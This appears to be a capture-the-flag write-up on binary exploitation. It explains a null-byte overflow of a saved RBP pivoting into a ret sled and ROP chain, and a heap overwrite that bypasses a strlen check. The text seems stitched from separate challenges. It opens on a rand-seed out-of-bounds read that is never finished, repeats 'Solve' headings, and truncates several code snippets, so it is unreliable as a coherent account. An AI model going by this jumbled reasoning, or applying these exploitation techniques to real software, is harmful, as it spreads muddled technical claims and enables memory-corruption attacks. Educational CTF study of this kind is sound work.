## Treasure manifest
This challenge is an out of bounds read to get the rand seed, followed by reversing the random shuffle to find the flag.  

### Solve
We can try running the program first.  

The program mallocs 4 bytes to hold the current time, which is then used as the seed for the random.  
As for the chest array, it first fills arr[0....9999] with a pointer to the string `"Empty chest... nothing but cobwebs"`  
Subsequently, it reads the flag into the _flag variable and fills arr[0....9998] with pointers to different strings.  
```c

{
  long lVar1;
  int random_num;
  long in_FS_OFFSET;
  undefined4 i;
  undefined8 cur_item;
```

The flag is first loaded into a random memory address. 3 clue functions are then called. In particular, after scanning of input, `getchar()` is called. This gives us a null byte overflow into the saved RBP value, which we can use to jump back into our buffer and execute our rop chain.  
### Solve
"Why? Why does this null byte overflow cause execution to jump back into our buffer? That doesn't even make sense!!" is what I used to think. Thankfully, I have enlightened myself, and I would be delighted to enlighten you too (maybe, hopefully???) to the best of my ability.  
#### Saved RBP
What is the saved RBP 🤔🤔🤔🤔. In x86-64, the Register Base Pointer (RBP) is used to mark the base of the current function's stack frame.  
When a function is called, it typically does:  
```bash
push rbp
mov rbp, rsp #rbp = rsp
```
The OLD `RBP` (from the caller) is pushed onto the stack. This value is called the saved RBP.  
When a function finishes, `leave ret` is called, which translates to:  
```bash
mov rsp, rbp -> rsp = rbp
pop rbp -> rbp = saved rbp
ret
```
This does 3 things.  
1. restores the stack pointer `RSP` to where `RBP` is (current frame base)
2. restores `RBP` back to where the previous `RBP` was (so `RBP` is now located at the `SAVED RBP` value/the caller's value)
3. return using return address

Note that even if the `SAVED RBP` was overwritten with garbage (as with typical buffer overflow challenges), it would not affect execution *yet* as the stack pointer `RSP` is still at a valid location.  
Now think about it, what if `leave ret` was called TWICE!  
During the second call, `RSP` would get moved to wherever the `SAVED RBP` was. In our case, the null byte would make the `SAVED RBP` point to our buffer, so if `RSP` was moved there, we would be able to `ret` and execute our rop chain.    
```bash
# 2nd time
mov rsp, rbp -> rsp = saved rbp = the clobbered address
pop rbp
ret
```

Afterwards, our `saved RBP` value is now pointing to somewhere INSIDE our buffer. As mentioned previously, for us to get our stack pointer to actually point to this value, we will need to call `leave ret` twice.  
Well, the program conveniently calls `clue3` again for us if our input fails to meet the required value `7`.  

#### ret sled
If you run our script a few times, you may realise that the location in the buffer as to which our overwritten `saved RBP` points to is random. I guess it is because it is a stack pointer and thus ASLR causes it to be different every time.  
We can overcome this with the use of a ret sled in our buffer. By filling up our buffer with `ret`, regardless of where `RBP` points, execution would continue until it reaches our main ROP chain.  

#### ROP
Our first ROP will be to get our libc address. We return to main so we can do our exploit again.  
```python

payload += b'A'*8 #fake saved RBP value for when main returns

payload = ret * ((256 - len(payload)) // 8) + payload
```

#### Egghunter

scanf will read and store null bytes from your input. As the length of the string to read is not specified, scanf will terminate upon reaching a whitespace character.  
However, `strlen()` stops immediately after encountering the first null byte. Thus, if we fill up the first `0xff` of our input with null bytes, we will pass the check and it gives us our overwrite of neighbouring values.  
```c
  c1 = (char *)malloc(0x100);
  c2 = (undefined8 *)malloc(0x38);
  *c2 = 0x6c614d2066656843;
  *(undefined4 *)(c2 + 1) = 0x636f6c;
  *(undefined4 *)(c2 + 4) = 6;
  c2[5] = 0xdeadbeefcafebabe;
  c2[6] = &PTR_s_Stack_Overflow_Stew_004071e0;
```
The program initializes 2 chunks, `c1` and `c2`. `c1` is where our write begins, while `c2` contains the data that we will be wanting to control.  
The layout is as so:  
```
c2[0..1] -> chefs name (chef malloc)  
c2[4] -> experience  
c2[5] -> canary value
c2[6] -> pointer to menu pointer
```

Now, we just need to figure out how to pass all the checks.  
Let's start with trying to get a deterministic output from the random item pick  
```c
random = rand();
local_14c = (int)((ulong)(long)random % *(ulong *)(c2[6] + 8))
```
The program calculates `random % *(c2[6]+8)`. Originally, `*(c2[6]+8)` is equal to 6 (cus theres 6 menu items). If we want the same item to be used every time, this value needs to be `1` as `n%1 = 0`.  
VERY CONVENIENTLY, the program is giving this to us for FREE.  
take a look
```bash
pwndbg> x/6gx 0x00000000004071e0  #pointer at c2[6]

0x4071f0:       0x00000000004071a0      0x0000000000000001
0x407200 <stdout>:      0x00007ffff7fa35c0      0x0000000000000000
```

If c2[6] had the value `0x4071f0`, `*(c2[6]+8)` would be `1` giving us deterministic selection!  
AND just so happens that `*(c2[6])` would ALSO POINT DIRECTLY TO OUR FLAG!!!  
So, as our "random item choice" would now always be the first item in the menu, and our menu starts from our flag, we would win our flag :) yay  
Now, lets check how much exp we need.  
```c
local_14c = (int)((ulong)(long)random % *(ulong *)(c2[6] + 8));
local_138 = (char *)((long)local_14c * 0x3c + *(long *)c2[6]);

```
Looking at the check_exp function  
```c

{
  undefined8 uVar1;
``` 

It calculates `exp = our_exp - exp_needed`. exp needs to be withint the range `-3<=exp<=3` to be accepted.  
exp_needed is located at `*(undefined4 *)((long)local_14c * 0x3c + *(long *)c2[6] + 0x18)`, which in nicer terms means `menu[index_of_menu_item][location_of_exp]`. `local_14c*0x3c` is the idx (for us we control it to be 0), so we just need to look at `*(c2[6]) + 0x18` for our exp.  

As our exp is typecasted to `undefined4` it uses only the last 4 bytes, exp needed is `0x7a69`.  
AND NOW, we have everything that we need to craft our payload.
